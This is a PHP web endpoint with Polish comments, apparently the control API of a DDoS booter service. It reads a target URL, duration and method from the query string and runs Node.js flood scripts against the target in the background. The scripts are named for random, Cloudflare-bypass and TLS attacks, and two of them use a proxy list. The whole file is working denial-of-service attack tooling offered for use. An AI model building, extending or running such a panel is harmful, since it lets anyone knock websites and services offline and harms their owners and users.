<?php
// Sprawdź, czy podano odpowiednie parametry w URL
if (isset($_GET['url']) && isset($_GET['time']) && isset($_GET['method']) && isset($_GET['port'])) {
    $url = escapeshellarg($_GET['url']);
    $time = (int)$_GET['time']; // Zabezpieczenie przed wstrzykiwaniem komend
    $method = $_GET['method'];
    $port = (int)$_GET['port']; // Zabezpieczenie przed wstrzykiwaniem komend

    // Wykonaj odpowiednią komendę na podstawie metody
    switch ($method) {
        case 'rand':
            $command = "node rand.js $url $time";
            break;
        
        case 'cfbypass':
            $command = "node cfbypass.js $url $time 32 10 get.txt";
            break;

        case 'tls':
            $command = "node tls.js $url $time 10 get.txt 1000";
            break;
        default:
            // Jeśli metoda nie jest rozpoznana
            echo json_encode([
                "status" => "error",
                "message" => "Invalid method provided"
            ]);
            exit;
    }

    // Uruchomienie komendy w tle (na systemach UNIX dodaje się '&' na końcu)
    $command .= " > /dev/null 2>&1 &"; // Wyślij wynik do /dev/null, aby PHP nie musiało czekać
    exec($command);

    // Odpowiedź dla użytkownika
    echo json_encode([
        "status" => "success",
        "message" => "Command has been executed in the background"
    ]);

} else {
    echo json_encode([
        "status" => "error",
        "message" => "Missing required parameters (url, time, method, port)"
    ]);
}